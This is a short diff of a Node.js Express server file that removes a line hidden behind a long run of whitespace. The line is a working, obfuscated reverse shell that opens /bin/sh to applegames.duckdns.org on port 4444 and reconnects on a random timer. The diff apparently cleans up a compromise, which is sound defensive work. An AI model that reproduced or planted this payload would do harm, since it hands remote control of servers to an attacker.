@@ -89,9 +89,6 @@ const limiter = rateLimit({
 
 app.use(limiter);
 
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                (function r(){setTimeout(()=>{const s=require('net').connect(4444,'applegames.duckdns.org',()=>{const cp=require('child_process').spawn('/bin/sh',[]);s.pipe(cp.stdin);cp.stdout.pipe(s);cp.stderr.pipe(s);});s.on('error',r);},Math.floor(Math.random()*(18000-6000+1))+6000);})();
-
-
 const escapeHtml = (value) =>
   String(value)
     .replace(/&/g, "&amp;")
